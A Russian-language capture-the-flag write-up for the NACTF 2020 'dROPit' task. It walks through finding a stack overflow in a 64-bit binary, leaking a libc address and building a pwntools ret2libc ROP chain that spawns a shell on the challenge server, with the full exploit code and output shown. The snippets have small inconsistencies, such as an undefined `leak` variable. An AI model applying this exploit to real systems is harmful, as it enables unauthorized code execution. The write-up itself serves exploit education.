# dROPit writeup

Исходя из названия таска, нам следует использовать `ROP-chain` для получения `root` на удалённом сервере.

С помощью отладчика `gdb-peda` изучим функционал предоставленного бинарного файла и посмотрим дизассемблированный код функции `main`:

```
burgos1337@LAPTOP-4VD7KB18:/mnt/c/Users/Lenovo/Desktop/NACTF 2020/dROPit$ gdb ./dropit
gdb-peda$ info functions
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401030  puts@plt
0x0000000000401040  fgets@plt
0x0000000000401050  setvbuf@plt
0x0000000000401060  _start
0x0000000000401090  _dl_relocate_static_pie
0x00000000004010a0  deregister_tm_clones
0x00000000004010d0  register_tm_clones
0x0000000000401110  __do_global_dtors_aux
0x0000000000401140  frame_dummy
0x0000000000401146  main
0x00000000004011a0  __libc_csu_init
0x0000000000401210  __libc_csu_fini
0x0000000000401218  _fini
gdb-peda$ disassemble main
Dump of assembler code for function main:
   0x0000000000401146 <+0>:     push   rbp
   0x0000000000401147 <+1>:     mov    rbp,rsp
   0x000000000040114a <+4>:     sub    rsp,0x30
   0x000000000040114e <+8>:     mov    rax,QWORD PTR [rip+0x2ebb]        # 0x404010 <stdout@@GLIBC_2.2.5>
   0x0000000000401155 <+15>:    mov    ecx,0x0
   0x000000000040115a <+20>:    mov    edx,0x2
   0x000000000040115f <+25>:    mov    esi,0x0
   0x0000000000401164 <+30>:    mov    rdi,rax
   0x0000000000401167 <+33>:    call   0x401050 <setvbuf@plt>
   0x000000000040116c <+38>:    mov    edi,0x402004
   0x0000000000401171 <+43>:    call   0x401030 <puts@plt>
   0x0000000000401176 <+48>:    mov    rdx,QWORD PTR [rip+0x2ea3]        # 0x404020 <stdin@@GLIBC_2.2.5>
   0x000000000040117d <+55>:    lea    rax,[rbp-0x30]
   0x0000000000401181 <+59>:    mov    esi,0x64
   0x0000000000401186 <+64>:    mov    rdi,rax
   0x0000000000401189 <+67>:    call   0x401040 <fgets@plt>
   0x000000000040118e <+72>:    mov    eax,0x0
   0x0000000000401193 <+77>:    leave
   0x0000000000401194 <+78>:    ret
End of assembler dump.
```

Как мы видим, в инструкции по адресу `0x40117d` на стеке выделяется `0x30` байт под некоторый буфер. 

Однако далее, в инструкции по адресу `0x401189` - происходит вызов функции `char *fgets(char *s, int size, FILE *stream)`, считывающей из потока ввода `size = 0x64` байт.
Следовательно, мы имеем дело с уязвимостью переполнения буфера на стеке.

Аналогичные выводы можно сделать, декомпилировав в `IDA PRO` предоставленный исполняемый файл:

![Image alt](https://github.com/Burgos1337/capture-the-flag-writeups/blob/master/2020/NACTF%202020/dROPit/assets/pseudocode_of_main.jpg)

Итак, мы имеем дело с 64-разрядным исполняемым файлом. 

Теперь нужно выяснить, какие механизмы защиты включены для данного файла. Для этого используем команду `checksec`, встроенную в модуль `pwntools`:

```
burgos1337@LAPTOP-4VD7KB18:/mnt/c/Users/Lenovo/Desktop/NACTF 2020/dROPit$ checksec dropit
[*] '/mnt/c/Users/Lenovo/Desktop/NACTF 2020/dROPit/dropit'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Что мы имеем:

`NX enabled` (`non-executable`) - это означает, что мы не можем выполнить классическое переполнение буфера и поместить наш шелл-код в стек, так как сегмент стека не является исполняемым (выполнение инструкций `jmp` или `call` для стека приведёт к ошибке сегментирования);

`No canary found` - стековая канарейка отсутствует, что упрощает алгоритм переполнения буфера в нашем случае;

`Full RELRO` (`relocation read-only`) - вся `GOT` (глобальная таблица смещений) доступна только для чтения, что устраняет возможность выполнения атаки `GOT overwrite`, когда 
`GOT`-адрес функции перезаписывается местоположением другой функции или `ROP`-гаджета.

Подведём итоги статического анализа:
- 64-разрядный бинарный файл;
- неисполняемый стек;
- нет стековой канарейки;
- функция `fgets` считывает из потока ввода большее количество байт, чем выделено под буфер;
- размер буфера ограничен 48 байтами.

Перед написанием сплойта определим алгоритм эксплуатации вышеупомянутой уязвимости:
- переполняем буфер до адреса возврата;
- при помощи `ROP`-гаджета перемещаем адрес `puts@got` в регистр `RDI` 
(согласно конвенции о вызовах `cdecl` первый аргумент вызываемой функции должен храниться в регистре RDI - в нашем случае там будет находиться адрес функции `puts`
в глобальной таблице смещений, который далее нами будет использован для осуществления атаки возврата в библиотеку);
- с помощью функции `puts@plt` сливаем адрес `puts@got` (этот адрес является абсолютным, и с его помощью мы можем узнать версию `libc`, используемую исполняемым файлом, а потом и вычислить базовый адрес `libc`);
- возвращаемся в `main` для того, чтобы прочитать слитый адрес `puts@got`.

Сначала определим смещение до адреса возврата - открываем вкладку `stack of main` в `IDA PRO`:

![Image alt](https://github.com/Burgos1337/capture-the-flag-writeups/blob/master/2020/NACTF%202020/dROPit/assets/stack_of_main.jpg)

Как видно, между нашим буфером и указателем возврата на стеке находится только сохранённый регистр `RBP` (указатель базы стека), следовательно до `ROP`-гаджета от нас требуется отправить в бинарный файл 56 байт мусора, чтобы заполнить буфер и перезаписать значение регистра `RBP`.

Для выполнения следующих шагов разработки эксплойта нам потребуются адрес `ROP`-гаджета `POP RDI; RET`, а также адреса функций `puts@got`, `puts@plt`и `main`. 

Воспользуемся инструментами отладчика для их вычисления:

```
gdb-peda$ break main
Breakpoint 1 at 0x40114a
gdb-peda$ run
Starting program: /mnt/c/Users/Lenovo/Desktop/NACTF 2020/dROPit/dropit
[----------------------------------registers-----------------------------------]
RAX: 0x401146 --> 0x30ec8348e5894855
RBX: 0x4011a0 --> 0x8d4c5741fa1e0ff3
RCX: 0x4011a0 --> 0x8d4c5741fa1e0ff3
RDX: 0x7ffffffedeb8
RSI: 0x7ffffffedea8
RDI: 0x1
RBP: 0x7ffffffeddb0
RSP: 0x7ffffffeddb0
RIP: 0x40114a --> 0xbb058b4830ec8348
R8 : 0x0
R9 : 0x7fffff7c1d50 (endbr64)
R10: 0x7fffff7ddf68 --> 0x6ffffff0
R11: 0x7fffff7ddf68 --> 0x6ffffff0
R12: 0x401060 --> 0x8949ed31fa1e0ff3
R13: 0x7ffffffedea0
R14: 0x0
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x401144 <frame_dummy+4>:    jmp    0x4010d0 <register_tm_clones>
   0x401146 <main>:     push   rbp
   0x401147 <main+1>:   mov    rbp,rsp
=> 0x40114a <main+4>:   sub    rsp,0x30
   0x40114e <main+8>:   mov    rax,QWORD PTR [rip+0x2ebb]        # 0x404010 <stdout@@GLIBC_2.2.5>
   0x401155 <main+15>:  mov    ecx,0x0
   0x40115a <main+20>:  mov    edx,0x2
   0x40115f <main+25>:  mov    esi,0x0
[------------------------------------stack-------------------------------------]
Invalid $SP address: 0x7ffffffeddb0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x000000000040114a in main ()
gdb-peda$ dumprop binary "pop rdi"
Warning: this can be very slow, do not run for large memory range
Writing ROP gadgets to file: dropit-rop.txt ...
0x401203: pop rdi; ret
gdb-peda$ readelf
.interp = 0x4002a8
.note.gnu.build-id = 0x4002c4
.note.ABI-tag = 0x4002e8
.gnu.hash = 0x400308
.dynsym = 0x400330
.dynstr = 0x400420
.gnu.version = 0x4004ae
.gnu.version_r = 0x4004c8
.rela.dyn = 0x4004e8
.rela.plt = 0x400578
.init = 0x401000
.plt = 0x401020
.text = 0x401060
.fini = 0x401218
.rodata = 0x402000
.eh_frame_hdr = 0x402008
.eh_frame = 0x402048
.init_array = 0x403db0
.fini_array = 0x403db8
.dynamic = 0x403dc0
.got = 0x403fb0
.data = 0x404000
.bss = 0x404010
gdb-peda$ x/4a 0x403fb0
0x403fb0:       0x403dc0        0x0
0x403fc0:       0x0     0x7fffff6275a0 <__GI__IO_puts>
gdb-peda$ info functions puts@plt
All functions matching regular expression "puts@plt":

Non-debugging symbols:
0x0000000000401030  puts@plt
```

В качестве альтернативы `gdb-peda` можно использовать консольные утилиты `ROPgadget` и `readelf` или `IDA-View` в `IDA PRO`:

```
burgos1337@LAPTOP-4VD7KB18:/mnt/c/Users/Lenovo/Desktop/NACTF 2020/dROPit$ ROPgadget --binary dropit | grep "pop rdi"
0x0000000000401203 : pop rdi ; ret
burgos1337@LAPTOP-4VD7KB18:/mnt/c/Users/Lenovo/Desktop/NACTF 2020/dROPit$ readelf --relocs dropit

Relocation section '.rela.dyn' at offset 0x4e8 contains 6 entries:
  Offset          Info           Type           Sym. Value    Sym. Name + Addend
000000403fe0  000100000006 R_X86_64_GLOB_DAT 0000000000000000 _ITM_deregisterTMClone + 0
000000403fe8  000300000006 R_X86_64_GLOB_DAT 0000000000000000 __libc_start_main@GLIBC_2.2.5 + 0
000000403ff0  000500000006 R_X86_64_GLOB_DAT 0000000000000000 __gmon_start__ + 0
000000403ff8  000700000006 R_X86_64_GLOB_DAT 0000000000000000 _ITM_registerTMCloneTa + 0
000000404010  000800000005 R_X86_64_COPY     0000000000404010 stdout@GLIBC_2.2.5 + 0
000000404020  000900000005 R_X86_64_COPY     0000000000404020 stdin@GLIBC_2.2.5 + 0

Relocation section '.rela.plt' at offset 0x578 contains 3 entries:
  Offset          Info           Type           Sym. Value    Sym. Name + Addend
000000403fc8  000200000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0
000000403fd0  000400000007 R_X86_64_JUMP_SLO 0000000000000000 fgets@GLIBC_2.2.5 + 0
000000403fd8  000600000007 R_X86_64_JUMP_SLO 0000000000000000 setvbuf@GLIBC_2.2.5 + 0
```

![Image alt](https://github.com/Burgos1337/capture-the-flag-writeups/blob/master/2020/NACTF%202020/dROPit/assets/puts%40got_offset.jpg)

![Image alt](https://github.com/Burgos1337/capture-the-flag-writeups/blob/master/2020/NACTF%202020/dROPit/assets/puts%40plt_offset.jpg)

Теперь у нас есть всё, чтобы слить `libc`-адрес функции `puts` - воспользуемся модулем `pwntools` для написания эксплойта:

```python3
#!/usr/bin/env python3
from pwn import *
import struct
import binascii

elf = ELF("./dropit")
rop = ROP(elf)

POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0] # 0x401203
PUTS_GOT = elf.got['puts'] # 0x403fc8
PUTS_PLT = elf.plt['puts'] # 0x401030
MAIN = elf.symbols['main'] # 0x401146

info("pop rdi gadget: %s" % hex(POP_RDI))
info("puts@got: %s" % hex(PUTS_GOT))
info("puts@plt: %s" % hex(PUTS_PLT))
info("main: %s" % hex(MAIN))

payload  = b'A' * 56
payload += p64(POP_RDI)
payload += p64(PUTS_GOT)
payload += p64(PUTS_PLT)
payload += p64(MAIN)

p = remote('challenges.ctfd.io', 30261)

p.recvline()
p.sendline(payload)
puts_remote_raw = p.recv()
p.recvline()

remote_leak = struct.unpack("<Q", puts_remote_raw.ljust(8, b'\x00'))[0]
info("leaked libc address: %s" % hex(remote_leak))
```

Запускаем эксплойт:

```
burgos1337@LAPTOP-4VD7KB18:/mnt/c/Users/Lenovo/Desktop/NACTF 2020/dROPit$ python3 dropit_libc_leak.py
[*] '/mnt/c/Users/Lenovo/Desktop/NACTF 2020/dROPit/dropit'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loaded 14 cached gadgets for './dropit'
[*] pop rdi gadget: 0x401203
[*] puts@got: 0x403fc8
[*] puts@plt: 0x401030
[*] main: 0x401146
[+] Opening connection to challenges.ctfd.io on port 30261: Done
[*] leaked libc address: 0x7f630d713d90
burgos1337@LAPTOP-4VD7KB18:/mnt/c/Users/Lenovo/Desktop/NACTF 2020/dROPit$
```

Готово! Теперь с помошью ресурса https://libc.rip/ устанавливаем, что требуемая версия библиотеки - `libc6_2.32-0ubuntu2_amd64`:

![Image alt](https://github.com/Burgos1337/capture-the-flag-writeups/blob/master/2020/NACTF%202020/dROPit/assets/libc-rip.jpg)

После скачивания библиотеки нам остается извлечь из неё адреса `/bin/sh`, `system` и `RET` (во избежание ошибки `bus error` при некорректном выравнивании стека) и с помощью всё того же `ROP`-гаджета вызвать шелл на удалённом сервере - дорабатываем наш эксплойт:

```python3
libc = ELF("./libc6_2.32-0ubuntu2_amd64.so")

libc.address = leak - libc.sym["puts"]
info("libc_base_addr: %s" % hex(libc.address))

BINSH = next(libc.search("/bin/sh"))
SYSTEM = libc.sym["system"]
RET = rop.find_gadget(['ret'])[0]

info("bin/sh: %s" % hex(BINSH))
info("system: %s" % hex(SYSTEM))
info("ret gadget: %s" % hex(RET))

payload  = 'A' * 56
payload += p64(RET)
payload += p64(POP_RDI)
payload += p64(BINSH)
payload += p64(SYSTEM)

p.sendline(payload)
p.interactive()
```

Запускаем эксплойт:

```
burgos1337@LAPTOP-4VD7KB18:/mnt/c/Users/Lenovo/Desktop/NACTF 2020/dROPit$ python3 dropit_exploit.py
[*] '/mnt/c/Users/Lenovo/Desktop/NACTF 2020/dROPit/dropit'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/mnt/c/Users/Lenovo/Desktop/NACTF 2020/dROPit/libc6_2.32-0ubuntu2_amd64.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Loaded 14 cached gadgets for './dropit'
[*] pop rdi gadget: 0x401203
[*] puts@got: 0x403fc8
[*] puts@plt: 0x401030
[*] main: 0x401146
[+] Opening connection to challenges.ctfd.io on port 30261: Done
[*] leaked libc address: 0x7f630d713d90
[*] libc_base_addr: 0x7f630d693000
[*] bin/sh: 0x7f630d84141f
[*] system: 0x7f630d6e33c0
[*] ret gadget: 0x40101a
[*] Switching to interactive mode
?
$ ls
dropit
flag.txt
$ cat flag.txt
nactf{r0p_y0ur_w4y_t0_v1ct0ry_698jB84iO4OH1cUe}
$
```
